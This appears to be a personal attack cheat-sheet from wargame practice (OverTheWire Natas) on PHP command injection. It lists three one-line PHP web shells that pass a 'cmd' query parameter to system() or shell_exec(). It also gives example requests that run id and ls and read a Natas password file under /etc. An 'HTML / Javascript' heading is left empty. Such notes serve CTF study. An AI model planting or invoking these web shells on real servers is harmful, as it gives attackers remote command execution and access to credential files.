# [Attack] Injection

## php

### Inject exec linux command in query
```php
<?php system($_GET["cmd"]); ?>
```

```php
<?php echo shell_exec($_GET['cmd']);?>
```

```php
<?php echo system($_GET["cmd"]);?>
```

- `http://localhost:8080/shell.php?cmd=id`    
- `http://localhost:8080/shell.php?cmd=ls%20|ls`    
`%20` is the spacing in query    

- `http://localhost:8080/idk.php?cmd=cat  /etc/natas_webpass/natas12`  

## HTML / Javascript

